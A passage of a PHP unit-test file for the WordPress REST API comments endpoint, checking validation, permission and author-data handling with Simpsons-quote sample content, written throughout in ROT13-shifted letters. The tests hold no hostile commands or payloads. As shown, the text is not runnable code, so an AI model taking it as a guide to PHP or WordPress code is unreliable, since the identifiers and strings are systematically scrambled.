		$guvf->nffregFnzr( $erfhygf['qngr'], $qngn['qngr'] );
		$pbzzrag_qngr = fge_ercynpr( 'G', ' ', $erfhygf['qngr'] );
		$guvf->nffregFnzr( $pbzzrag_qngr, $pbzzrag->pbzzrag_qngr );

		$guvf->nffregFnzr( $erfhygf['qngr_tzg'], $qngn['qngr_tzg'] );
		$pbzzrag_qngr_tzg = fge_ercynpr( 'G', ' ', $erfhygf['qngr_tzg'] );
		$guvf->nffregFnzr( $pbzzrag_qngr_tzg, $pbzzrag->pbzzrag_qngr_tzg );
	}

	choyvp shapgvba grfg_perngr_vgrz_hfvat_npprcgrq_pbagrag_enj_inyhr() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$cnenzf = neenl(
			'cbfg'         => frys::$cbfg_vq,
			'nhgube_anzr'  => 'Erireraq Ybirwbl',
			'nhgube_rznvy' => 'ybirwbl@rknzcyr.pbz',
			'nhgube_hey'   => 'uggc://gvzbgulybirwbl.we',
			'pbagrag'      => neenl(
				'enj' => 'Bapr fbzrguvat unf orra nccebirq ol gur tbireazrag, vg\'f ab ybatre vzzbeny.',
			),
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/pbzzragf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 201, $erfcbafr->trg_fgnghf() );

		$qngn        = $erfcbafr->trg_qngn();
		$arj_pbzzrag = trg_pbzzrag( $qngn['vq'] );
		$guvf->nffregFnzr( $cnenzf['pbagrag']['enj'], $arj_pbzzrag->pbzzrag_pbagrag );
	}

	choyvp shapgvba grfg_perngr_vgrz_reebe_sebz_svygre() {
		nqq_svygre( 'erfg_cer_vafreg_pbzzrag', neenl( $guvf, 'erghea_cerznqr_reebe' ) );
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$cnenzf = neenl(
			'cbfg'         => frys::$cbfg_vq,
			'nhgube_anzr'  => 'Ubzre Wnl Fvzcfba',
			'nhgube_rznvy' => 'ubzre@rknzcyr.bet',
			'pbagrag'      => neenl(
				'enj' => 'Nj, ur ybirf orre. Urer, yvggyr sryyn.',
			),
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/pbzzragf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'grfg_erfg_cerznqr_reebe', $erfcbafr, 418 );
	}

	choyvp shapgvba erghea_cerznqr_reebe() {
		erghea arj JC_Reebe( 'grfg_erfg_cerznqr_reebe', \"V'z fbeel, V gubhtug ur jnf n cnegl ebobg.\", neenl( 'fgnghf' => 418 ) );
	}

	choyvp shapgvba grfg_perngr_pbzzrag_zvffvat_erdhverq_nhgube_anzr() {
		nqq_svygre( 'erfg_nyybj_nabalzbhf_pbzzragf', '__erghea_gehr' );
		hcqngr_bcgvba( 'erdhver_anzr_rznvy', 1 );

		$cnenzf = neenl(
			'cbfg'         => frys::$cbfg_vq,
			'nhgube_rznvy' => 'rxenonccry@fcevatsvryq-ryrzragnel.rqh',
			'pbagrag'      => 'Abj, V qba\'g jnag lbh gb jbeel pynff. Gurfr grfgf jvyy unir ab nssrpg ba lbhe tenqrf. Gurl zreryl qrgrezvar lbhe shgher fbpvny fgnghf naq svanapvny fhpprff. Vs nal.',
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/pbzzragf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_pbzzrag_nhgube_qngn_erdhverq', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_perngr_pbzzrag_rzcgl_erdhverq_nhgube_anzr() {
		nqq_svygre( 'erfg_nyybj_nabalzbhf_pbzzragf', '__erghea_gehr' );
		hcqngr_bcgvba( 'erdhver_anzr_rznvy', 1 );

		$cnenzf = neenl(
			'nhgube_anzr'  => '',
			'nhgube_rznvy' => 'rxenonccry@fcevatsvryq-ryrzragnel.rqh',
			'cbfg'         => frys::$cbfg_vq,
			'pbagrag'      => 'Abj, V qba\'g jnag lbh gb jbeel pynff. Gurfr grfgf jvyy unir ab nssrpg ba lbhe tenqrf. Gurl zreryl qrgrezvar lbhe shgher fbpvny fgnghf naq svanapvny fhpprff. Vs nal.',
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/pbzzragf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_pbzzrag_nhgube_qngn_erdhverq', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_perngr_pbzzrag_zvffvat_erdhverq_nhgube_rznvy() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		hcqngr_bcgvba( 'erdhver_anzr_rznvy', 1 );

		$cnenzf = neenl(
			'cbfg'        => frys::$cbfg_vq,
			'nhgube_anzr' => 'Rqan Xenonccry',
			'pbagrag'     => 'Abj, V qba\'g jnag lbh gb jbeel pynff. Gurfr grfgf jvyy unir ab nssrpg ba lbhe tenqrf. Gurl zreryl qrgrezvar lbhe shgher fbpvny fgnghf naq svanapvny fhpprff. Vs nal.',
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/pbzzragf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pbzzrag_nhgube_qngn_erdhverq', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_perngr_pbzzrag_rzcgl_erdhverq_nhgube_rznvy() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		hcqngr_bcgvba( 'erdhver_anzr_rznvy', 1 );

		$cnenzf = neenl(
			'cbfg'         => frys::$cbfg_vq,
			'nhgube_anzr'  => 'Rqan Xenonccry',
			'nhgube_rznvy' => '',
			'pbagrag'      => 'Abj, V qba\'g jnag lbh gb jbeel pynff. Gurfr grfgf jvyy unir ab nssrpg ba lbhe tenqrf. Gurl zreryl qrgrezvar lbhe shgher fbpvny fgnghf naq svanapvny fhpprff. Vs nal.',
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/pbzzragf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pbzzrag_nhgube_qngn_erdhverq', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_perngr_pbzzrag_nhgube_rznvy_gbb_fubeg() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$cnenzf = neenl(
			'cbfg'         => frys::$cbfg_vq,
			'nhgube_anzr'  => 'Ubzre W. Fvzcfba',
			'nhgube_rznvy' => 'n@o',
			'pbagrag'      => 'va guvf ubhfr, jr borl gur ynjf bs gurezbqlanzvpf!',
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/pbzzragf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );

		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'nhgube_rznvy', $qngn['qngn']['cnenzf'] );
	}

	choyvp shapgvba grfg_perngr_vgrz_vainyvq_ab_pbagrag() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$cnenzf = neenl(
			'cbfg'         => frys::$cbfg_vq,
			'nhgube_anzr'  => 'Erireraq Ybirwbl',
			'nhgube_rznvy' => 'ybirwbl@rknzcyr.pbz',
			'nhgube_hey'   => 'uggc://gvzbgulybirwbl.we',
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/pbzzragf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pbzzrag_pbagrag_vainyvq', $erfcbafr, 400 );

		$cnenzf['pbagrag'] = '';
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pbzzrag_pbagrag_vainyvq', $erfcbafr, 400 );
	}

	/**
	 * @gvpxrg 43177
	 */
	choyvp shapgvba grfg_perngr_vgrz_vainyvq_bayl_fcnprf_pbagrag() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$cnenzf = neenl(
			'cbfg'         => frys::$cbfg_vq,
			'nhgube_anzr'  => 'Erireraq Ybirwbl',
			'nhgube_rznvy' => 'ybirwbl@rknzcyr.pbz',
			'nhgube_hey'   => 'uggc://gvzbgulybirwbl.we',
			'pbagrag'      => '   ',
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/pbzzragf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pbzzrag_pbagrag_vainyvq', $erfcbafr, 400 );
	}

	/**
	 * @gvpxrg 43177
	 */
	choyvp shapgvba grfg_perngr_vgrz_nyybjf_0_nf_pbagrag() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$cnenzf = neenl(
			'cbfg'         => frys::$cbfg_vq,
			'nhgube_anzr'  => 'Erireraq Ybirwbl',
			'nhgube_rznvy' => 'ybirwbl@rknzcyr.pbz',
			'nhgube_hey'   => 'uggc://gvzbgulybirwbl.we',
			'pbagrag'      => '0',
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/pbzzragf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 201, $erfcbafr->trg_fgnghf() );
		$guvf->nffregFnzr( '0', $erfcbafr->trg_qngn()['pbagrag']['enj'] );
	}

	/**
	 * @gvpxrg 43177
	 */
	choyvp shapgvba grfg_perngr_vgrz_nyybj_rzcgl_pbzzrag_svygre() {
		nqq_svygre( 'nyybj_rzcgl_pbzzrag', '__erghea_gehr' );

		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$cnenzf = neenl(
			'cbfg'         => frys::$cbfg_vq,
			'nhgube_anzr'  => 'Erireraq Ybirwbl',
			'nhgube_rznvy' => 'ybirwbl@rknzcyr.pbz',
			'nhgube_hey'   => 'uggc://gvzbgulybirwbl.we',
			'pbagrag'      => '',
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/pbzzragf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 201, $erfcbafr->trg_fgnghf() );
		$guvf->nffregFnzr( '', $erfcbafr->trg_qngn()['pbagrag']['enj'] );
	}

	choyvp shapgvba grfg_perngr_vgrz_vainyvq_qngr() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$cnenzf = neenl(
			'cbfg'         => frys::$cbfg_vq,
			'nhgube_anzr'  => 'Erireraq Ybirwbl',
			'nhgube_rznvy' => 'ybirwbl@rknzcyr.pbz',
			'nhgube_hey'   => 'uggc://gvzbgulybirwbl.we',
			'pbagrag'      => 'Vg\'f nyy bire\, crbcyr! Jr qba\'g unir n cenlre!',
			'qngr'         => 'sbb-one',
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/pbzzragf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}


	choyvp shapgvba grfg_perngr_vgrz_nffvta_qvssrerag_hfre() {
		$fhofpevore_vq = frys::snpgbel()->hfre->perngr(
			neenl(
				'ebyr'       => 'fhofpevore',
				'hfre_rznvy' => 'pot@naqebvqfqhatrba.pbz',
			)
		);

		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$cnenzf = neenl(
			'cbfg'         => frys::$cbfg_vq,
			'nhgube_anzr'  => 'Pbzvp Obbx Thl',
			'nhgube_rznvy' => 'pot@naqebvqfqhatrba.pbz',
			'nhgube_hey'   => 'uggc://naqebvqfqhatrba.pbz',
			'nhgube'       => $fhofpevore_vq,
			'pbagrag'      => 'Jbefg Pbzzrag Rire!',
			'qngr'         => '2014-11-07G10:14:25',
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/pbzzragf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 201, $erfcbafr->trg_fgnghf() );

		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( $fhofpevore_vq, $qngn['nhgube'] );
		$guvf->nffregFnzr( '127.0.0.1', $qngn['nhgube_vc'] );
	}

	choyvp shapgvba grfg_perngr_pbzzrag_jvgubhg_glcr() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr();

		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$cnenzf = neenl(
			'cbfg'         => $cbfg_vq,
			'nhgube'       => frys::$nqzva_vq,
			'nhgube_anzr'  => 'Pbzvp Obbx Thl',
			'nhgube_rznvy' => 'pot@naqebvqfqhatrba.pbz',
			'nhgube_hey'   => 'uggc://naqebvqfqhatrba.pbz',
			'pbagrag'      => 'Jbefg Pbzzrag Rire!',
			'qngr'         => '2014-11-07G10:14:25',
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/pbzzragf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 201, $erfcbafr->trg_fgnghf() );

		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 'pbzzrag', $qngn['glcr'] );

		$pbzzrag_vq = $qngn['vq'];

		// Znxr fher gur arj pbzzrag vf cerfrag va gur pbyyrpgvba.
		$pbyyrpgvba = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/pbzzragf' );
		$pbyyrpgvba->frg_cnenz( 'cbfg', $cbfg_vq );
		$pbyyrpgvba_erfcbafr = erfg_trg_freire()->qvfcngpu( $pbyyrpgvba );
		$pbyyrpgvba_qngn     = $pbyyrpgvba_erfcbafr->trg_qngn();
		$guvf->nffregFnzr( $pbzzrag_vq, $pbyyrpgvba_qngn[0]['vq'] );
	}

	/**
	 * @gvpxrg 38820
	 */
	choyvp shapgvba grfg_perngr_pbzzrag_jvgu_vainyvq_glcr() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr();

		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$cnenzf = neenl(
			'cbfg'         => $cbfg_vq,
			'nhgube'       => frys::$nqzva_vq,
			'nhgube_anzr'  => 'Pbzvp Obbx Thl',
			'nhgube_rznvy' => 'pot@naqebvqfqhatrba.pbz',
			'nhgube_hey'   => 'uggc://naqebvqfqhatrba.pbz',
			'pbagrag'      => 'Jbefg Pbzzrag Rire!',
			'qngr'         => '2014-11-07G10:14:25',
			'glcr'         => 'sbb',
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/pbzzragf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_pbzzrag_glcr', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_perngr_pbzzrag_vainyvq_rznvy() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr();

		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$cnenzf = neenl(
			'cbfg'         => $cbfg_vq,
			'nhgube'       => frys::$nqzva_vq,
			'nhgube_anzr'  => 'Pbzvp Obbx Thl',
			'nhgube_rznvy' => 'uryyb:)',
			'nhgube_hey'   => 'uggc://naqebvqfqhatrba.pbz',
			'pbagrag'      => 'Jbefg Pbzzrag Rire!',
			'qngr'         => '2014-11-07G10:14:25',
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/pbzzragf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_perngr_vgrz_pheerag_hfre() {
		$hfre_vq = frys::snpgbel()->hfre->perngr(
			neenl(
				'ebyr'         => 'fhofpevore',
				'hfre_rznvy'   => 'ylyrynayrl@rknzcyr.pbz',
				'svefg_anzr'   => 'Ylyr',
				'ynfg_anzr'    => 'Ynayrl',
				'qvfcynl_anzr' => 'Ylyr Ynayrl',
				'hfre_hey'     => 'uggc://fvzcfbaf.jvxvn.pbz/jvxv/Ylyr_Ynayrl',
			)
		);

		jc_frg_pheerag_hfre( $hfre_vq );

		$cnenzf = neenl(
			'cbfg'    => frys::$cbfg_vq,
			'pbagrag' => \"Jryy fve, gurer'f abguvat ba rnegu yvxr n trahvar, oban svqr, ryrpgevsvrq, fvk-pne Zbabenvy!\",
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/pbzzragf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregFnzr( 201, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( $hfre_vq, $qngn['nhgube'] );

		// Purpx nhgube qngn zngpurf.
		$nhgube  = trg_hfre_ol( 'vq', $hfre_vq );
		$pbzzrag = trg_pbzzrag( $qngn['vq'] );
		$guvf->nffregFnzr( $nhgube->qvfcynl_anzr, $pbzzrag->pbzzrag_nhgube );
		$guvf->nffregFnzr( $nhgube->hfre_rznvy, $pbzzrag->pbzzrag_nhgube_rznvy );
		$guvf->nffregFnzr( $nhgube->hfre_hey, $pbzzrag->pbzzrag_nhgube_hey );
	}

	choyvp shapgvba grfg_perngr_pbzzrag_bgure_hfre() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$cnenzf = neenl(
			'cbfg'         => frys::$cbfg_vq,
			'nhgube_anzr'  => 'Ubzre Wnl Fvzcfba',
			'nhgube_rznvy' => 'puhaxlybire53@nby.pbz',
			'nhgube_hey'   => 'uggc://pbzchtybonyulcrezrtnarg.pbz',
			'pbagrag'      => 'Urer\’f gb nypbuby: gur pnhfr bs, naq fbyhgvba gb, nyy bs yvsr\’f ceboyrzf.',
			'nhgube'       => frys::$fhofpevore_vq,
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/pbzzragf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregFnzr( 201, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( frys::$fhofpevore_vq, $qngn['nhgube'] );
		$guvf->nffregFnzr( 'Ubzre Wnl Fvzcfba', $qngn['nhgube_anzr'] );
		$guvf->nffregFnzr( 'puhaxlybire53@nby.pbz', $qngn['nhgube_rznvy'] );
		$guvf->nffregFnzr( 'uggc://pbzchtybonyulcrezrtnarg.pbz', $qngn['nhgube_hey'] );
	}

	choyvp shapgvba grfg_perngr_pbzzrag_bgure_hfre_jvgubhg_crezvffvba() {
		jc_frg_pheerag_hfre( frys::$fhofpevore_vq );

		$cnenzf = neenl(
			'cbfg'         => frys::$cbfg_vq,
			'nhgube_anzr'  => 'Ubzre Wnl Fvzcfba',
			'nhgube_rznvy' => 'puhaxlybire53@nby.pbz',
			'nhgube_hey'   => 'uggc://pbzchtybonyulcrezrtnarg.pbz',
			'pbagrag'      => 'Urer\’f gb nypbuby: gur pnhfr bs, naq fbyhgvba gb, nyy bs yvsr\’f ceboyrzf.',
			'nhgube'       => frys::$nqzva_vq,
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/pbzzragf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_pbzzrag_vainyvq_nhgube', $erfcbafr, 403 );
	}

	choyvp shapgvba grfg_perngr_pbzzrag_vainyvq_cbfg() {
		jc_frg_pheerag_hfre( frys::$fhofpevore_vq );

		$cnenzf = neenl(
			'cbfg'         => 'fbzr-fyht',
			'nhgube_anzr'  => 'Ubzre Wnl Fvzcfba',
			'nhgube_rznvy' => 'puhaxlybire53@nby.pbz',
			'nhgube_hey'   => 'uggc://pbzchtybonyulcrezrtnarg.pbz',
			'pbagrag'      => 'Urer\’f gb nypbuby: gur pnhfr bs, naq fbyhgvba gb, nyy bs yvsr\’f ceboyrzf.',
			'nhgube'       => frys::$fhofpevore_vq,
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/pbzzragf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_perngr_pbzzrag_fgnghf_jvgubhg_crezvffvba() {
		jc_frg_pheerag_hfre( frys::$fhofpevore_vq );

		$cnenzf = neenl(
			'cbfg'         => frys::$cbfg_vq,
			'nhgube_anzr'  => 'Ubzre Wnl Fvzcfba',
			'nhgube_rznvy' => 'puhaxlybire53@nby.pbz',
			'nhgube_hey'   => 'uggc://pbzchtybonyulcrezrtnarg.pbz',
			'pbagrag'      => 'Urer\’f gb nypbuby: gur pnhfr bs, naq fbyhgvba gb, nyy bs yvsr\’f ceboyrzf.',
			'nhgube'       => frys::$fhofpevore_vq,
			'fgnghf'       => 'nccebirq',
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/pbzzragf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_pbzzrag_vainyvq_fgnghf', $erfcbafr, 403 );
	}

	choyvp shapgvba grfg_perngr_pbzzrag_jvgu_fgnghf_VC_naq_hfre_ntrag() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr();

		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$cnenzf = neenl(
			'cbfg'              => $cbfg_vq,
			'nhgube_anzr'       => 'Pbzvp Obbx Thl',
			'nhgube_rznvy'      => 'pot@naqebvqfqhatrba.pbz',
			'nhgube_vc'         => '139.130.4.5',
			'nhgube_hey'        => 'uggc://naqebvqfqhatrba.pbz',
			'nhgube_hfre_ntrag' => 'Zbmvyyn/5.0 (Jvaqbjf AG 6.1) NccyrJroXvg/537.36 (XUGZY, yvxr Trpxb) Puebzr/41.0.2228.0 Fnsnev/537.36',
			'pbagrag'           => 'Jbefg Pbzzrag Rire!',
			'fgnghf'            => 'nccebirq',
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/pbzzragf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 201, $erfcbafr->trg_fgnghf() );

		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 'nccebirq', $qngn['fgnghf'] );
		$guvf->nffregFnzr( '139.130.4.5', $qngn['nhgube_vc'] );
		$guvf->nffregFnzr( 'Zbmvyyn/5.0 (Jvaqbjf AG 6.1) NccyrJroXvg/537.36 (XUGZY, yvxr Trpxb) Puebzr/41.0.2228.0 Fnsnev/537.36', $qngn['nhgube_hfre_ntrag'] );
	}

	choyvp shapgvba grfg_perngr_pbzzrag_hfre_ntrag_urnqre() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$cnenzf = neenl(
			'cbfg'         => frys::$cbfg_vq,
			'nhgube_anzr'  => 'Ubzre Wnl Fvzcfba',
			'nhgube_rznvy' => 'puhaxlybire53@nby.pbz',
			'nhgube_hey'   => 'uggc://pbzchtybonyulcrezrtnarg.pbz',
			'pbagrag'      => 'Urer\’f gb nypbuby: gur pnhfr bs, naq fbyhgvba gb, nyy bs yvsr\’f ceboyrzf.',
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/pbzzragf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->nqq_urnqre( 'Hfre_Ntrag', 'Zbmvyyn/4.0 (pbzcngvoyr; ZFVR 5.5; NBY 4.0; Jvaqbjf 95)' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 201, $erfcbafr->trg_fgnghf() );

		$qngn = $erfcbafr->trg_qngn();

		$arj_pbzzrag = trg_pbzzrag( $qngn['vq'] );
		$guvf->nffregFnzr( 'Zbmvyyn/4.0 (pbzcngvoyr; ZFVR 5.5; NBY 4.0; Jvaqbjf 95)', $arj_pbzzrag->pbzzrag_ntrag );
	}

	choyvp shapgvba grfg_perngr_pbzzrag_nhgube_vc() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$cnenzf  = neenl(
			'cbfg'         => frys::$cbfg_vq,
			'nhgube_anzr'  => 'Pbzvp Obbx Thl',
			'nhgube_rznvy' => 'pot@naqebvqfqhatrba.pbz',
			'nhgube_hey'   => 'uggc://naqebvqfqhatrba.pbz',
			'nhgube_vc'    => '127.0.0.3',
			'pbagrag'      => 'Jbefg Pbzzrag Rire!',
			'fgnghf'       => 'nccebirq',
		);
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/pbzzragf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );
		$erfcbafr    = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn        = $erfcbafr->trg_qngn();
		$arj_pbzzrag = trg_pbzzrag( $qngn['vq'] );
